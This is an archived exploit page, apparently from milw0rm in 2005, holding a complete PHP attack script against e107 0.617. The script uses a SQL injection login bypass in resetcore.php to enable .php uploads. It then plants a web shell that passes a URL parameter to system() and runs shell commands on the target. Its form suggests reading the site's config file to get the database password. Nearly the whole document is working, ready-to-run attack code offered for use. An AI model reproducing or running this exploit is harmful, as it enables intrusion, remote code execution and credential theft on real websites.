<html><head><title>e107 <= 0.6172 (resetcore.php) Remote SQL Injection Exploit</title></head><pre>&lt;?php
#   0.27 18/10/2005                                                            #
#                                                                              #
#   ---e017_xpl.php                                                            #
#                                                                              #
#   e107 0.617 resetcore.php SQL Injection &amp; remote code execution  all-in-one #
#                                                                              #
#                                 by rgod                                      #
#                      site: http://rgod.altervista.org                        #
#                                                                              #
#   make these changes in php.ini if you have troubles                         #
#   to launch this script:                                                     #
#   allow_call_time_pass_reference = on                                        #
#   register_globals = on                                                      #
#                                                                              #
#   usage: customize for your own pleasure, launch this script from Apache,    #
#   fill requested fields, then go!                                            #
#                                                                              #
#   Sun-Tzu: &quot;There is a proper season for making attacks with fire, and       #
#   special days for starting a conflagration. The proper season is when       #
#   the weather is very dry; the special days are those when the moon is       #
#   in the constellations of the Sieve, the Wall, the Wing or the Cross-bar;   #
#   for these four are all days of rising wind.&quot;                               #

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;, 2);
ob_implicit_flush (1);

echo'&lt;html&gt;&lt;head&gt;&lt;title&gt;e107 0.617 remote commands execution       &lt;/title&gt;&lt;meta
http-equiv=&quot;Content-Type&quot;   content=&quot;text/html;  charset=iso-8859-1&quot;&gt;     &lt;style
type=&quot;text/css&quot;&gt; body {	background-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff;
SCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #1CBc81; } a:hover{text-decoration: underline;
color : #1CB081; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;Stile6&quot;&gt;
e107 0.617 resetcore.php SQL injection &amp; remote commands execution &lt;/p&gt;      &lt;p&gt;
&lt;class=&quot;Stile6&quot;&gt; a  script     byrgod  at &lt;a href=&quot;http://rgod.altervista.org&quot;
target=&quot;_blank&quot;&gt;http://rgod.altervista.org&lt;/a&gt;&lt;/p&gt; &lt;table width=&quot;84%&quot;&gt;&lt;tr&gt;   &lt;td
width=&quot;43%&quot;&gt;      &lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;'.$SERVER[PHP_SELF].'
?path=value&amp;host=value&amp;port=value&amp;command=value&amp;proxy=value&quot;&gt;   &lt;p&gt;       &lt;input
type=&quot;text&quot; name=&quot;host&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt; hostname    (ex: www.sitename.com)
&lt;/span&gt;&lt;/p&gt;&lt;p&gt; &lt;input type=&quot;text&quot; name=&quot;path&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;path (ex: /e1
07/ or just /)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;port&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;
specify a port other than 80 (default value)  &lt;/span&gt; &lt;/p&gt; &lt;p&gt;&lt;input type=&quot;text&quot;
name=&quot;command&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;a shell command,    cat ./../../e107_config.
php to see database username/password  &lt;/span&gt;  &lt;/p&gt;  &lt;p&gt;   &lt;input   type=&quot;text&quot;
name=&quot;proxy&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;send exploit through an HTTP  proxy  (ip:port)
&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;go!&quot;&gt;   &lt;/p&gt;&lt;/form&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
while ($ii &lt;= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
             for ($li=0; $li&lt;=15; $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li+$ki].&quot;&lt;/td&gt;&quot;;
			    }
            $ki=$ki+16;
            echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
            }
if (strlen($datai)==1) {echo &quot;&lt;td&gt;0&quot;.$datai.&quot;&lt;/td&gt;&quot;;} else
{echo &quot;&lt;td&gt;&quot;.$datai.&quot;&lt;/td&gt; &quot;;}
$ii++;
$ji++;
}
for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
                       }

for ($li=$ci*16; $li&lt;=strlen($headeri); $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li].&quot;&lt;/td&gt;&quot;;
			    }
echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
}


function sendpacket($packet)
{
global $proxy, $host, $port, $html;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	   $proxy=trim($proxy);
 	   $parts=explode(':',$proxy);
       echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}


if (($path&lt;&gt;'') and ($host&lt;&gt;'') and ($command&lt;&gt;''))
{

$port=intval($port);
if (($port=='') or ($port&lt;=0)) {$port=80;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
echo 'Initiating exploit against '.htmlentities($host).':'.htmlentities($port);

#STEP 1 -&gt; SQL INJECTION in resetcore.php, bypass login and change upload settings
$data.=&quot;sitename=e107+powered+website&amp;siteurl=&quot;.urlencode('http://'.$host.':'.$port.$path).&quot;
&amp;sitebutton=button.png&amp;sitetag=e107+website+system&amp;sitedescription=&amp;siteadmin=suntzu
&amp;siteadminemail=fakefakefake@suntzu.com&amp;sitetheme=e107v4a&amp;admintheme=e107v4a
&amp;sitedisclaimer=All+trademarks+are+%A9+their+respective+owners%2C+all+other+content+
is+%A9+e107+powered+website.%3Cbr+%2F%3Ee107+is+%A9+e107.org+2002%2F2003+and+is+released+under+the+%
3Ca+href%3D%27http%3A%2F%2Fwww.gnu.org%2F%27%3EGNU+GPL+license%3C%2Fa%3E.
&amp;newsposts=10&amp;flood_protect=1&amp;flood_timeout=5&amp;flood_time=30&amp;flood_hits=100&amp;anon_post=1
&amp;user_reg=1&amp;use_coppa=1&amp;profanity_filter=1&amp;profanity_replace=%5Bcensored%5D&amp;chatbox_posts=10&amp;
smiley_activate=&amp;log_activate=&amp;log_refertype=1&amp;longdate=%25A+%25d+%25B+%25Y+-+%25H%3A%25M%3A%25S&amp;
shortdate=%25d+%25b+%3A+%25H%3A%25M&amp;forumdate=%25a+%25b+%25d+%25Y%2C+%25I%3A%25M%25p&amp;sitelanguage=
English&amp;maintainance_flag=0&amp;time_offset=0&amp;cb_linkc=+-link-+&amp;cb_wordwrap=20&amp;cb_linkreplace=1&amp;
log_lvcount=10&amp;meta_tag=&amp;user_reg_veri=1&amp;email_notify=0&amp;forum_poll=0&amp;forum_popular=10&amp;forum_track=0&amp;
forum_eprefix=%5Bforum%5D&amp;forum_enclose=1&amp;forum_title=Forums&amp;forum_postspage=10&amp;user_tracking=cookie&amp;
cookie_name=e107cookie&amp;resize_method=gd2&amp;im_path=%2Fusr%2FX11R6%2Fbin%2Fconvert&amp;im_quality=80&amp;
im_width=120&amp;im_height=100&amp;upload_enabled=1&amp;upload_allowedfiletype=.php&amp;
upload_storagetype=2&amp;upload_maxfilesize=&amp;upload_class=254&amp;cachestatus=&amp;displayrendertime=1&amp;
displaysql=&amp;displaythemeinfo=1&amp;link_submit=1&amp;link_submit_class=0&amp;timezone=GMT&amp;search_restrict=1&amp;
antiflood1=1&amp;antiflood_timeout=10&amp;autoban=1&amp;coreedit_sub=Save+Core+Settings&amp;a_name=&quot;;
$data.=urlencode(&quot;'or isnull(1/0)/*&quot;).&quot;&amp;a_password=d41d8cd98f00b204e9800998ecf8427e&quot;;
//                       ^                                  ^
//                       |                                  |
//            here we have login bypass ;)        hash of [nothing]
//so, you see, we activate public uploads and .php extensions for attachments
$packet=&quot;POST &quot;.$p.&quot;e107_files/resetcore.php HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.&quot;:&quot;.$port.$path.&quot;e107_files/resetcore.php\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Matrix S.p.A. - FAST Enterprise Crawler 6 (Unknown admin e-mail address)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=----------W1dUnnWzZExD8Rb1Pctwsq\r\n\r\n&quot;;
$packet.=$data;

show($packet);
sendpacket($packet);
if (eregi(&quot;Core settings successfully updated&quot;,$html)) {echo '&lt;br&gt;Ok... we reset core values...Continue...';}
                                                  else {echo '&lt;br&gt;Exploit failed...'; die;}

#STEP 2 -&gt; Upload a shell...
$data='------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name=&quot;file_name&quot;

baby
------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name=&quot;file_version&quot;

666
------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name=&quot;file_userfile[]&quot;; filename=&quot;c:\suntzu.php&quot;
Content-Type: multipart/form-data

&lt;?php error_reporting(0); ini_set(&quot;max_execution_time&quot;,0);
echo &quot;Hi Master\r\n&quot;; system($HTTP_GET_VARS[cmd]); ?&gt;
------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name=&quot;file_userfile[]&quot;; filename=&quot;&quot;


------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name=&quot;file_description&quot;

mphhh....
------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name=&quot;file_website&quot;


------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name=&quot;file_demo&quot;


------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name=&quot;upload&quot;

Submit and Upload
------------W1dUnnWzZExD8Rb1Pctwsq--';

$packet=&quot;POST &quot;.$p.&quot;upload.php HTTP/1.1\r\n&quot;;
$packet.=&quot;User-Agent: Nokia7110/1.0 (05.01) (Google WAP Proxy/1.0)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
$packet.=&quot;Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n&quot;;
$packet.=&quot;Accept-Language: it,en;q=0.9\r\n&quot;;
$packet.=&quot;Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.&quot;:&quot;.$port.$path.&quot;upload.php\r\n&quot;;
$packet.=&quot;Cookie: e107cookie=1.dcc479d5ffe15c00b2263328f1d60da4\r\n&quot;;
$packet.=&quot;Cookie2: \$Version=1\r\n&quot;;
$packet.=&quot;Connection: Close, TE\r\n&quot;;
$packet.=&quot;TE: deflate, gzip, chunked, identity, trailers\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=----------W1dUnnWzZExD8Rb1Pctwsq\r\n\r\n&quot;;
$packet.=$data;
show($packet);
sendpacket($packet);

#STEP 3 -&gt; Launch commands...
$packet=&quot;GET &quot;.$p.&quot;e107_files/public/suntzu.php?cmd=&quot;.urlencode($command).&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;User-Agent: Website eXtractor\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacket($packet);
if (eregi(&quot;Hi Master&quot;,$html)) {echo 'Exploit succeeded...';}
                        else  {echo 'Exploit failed...';}
}
else
{echo 'Fill in requested fields, optionally specify a proxy...';}

?&gt;

# milw0rm.com [2005-10-18]</pre></html>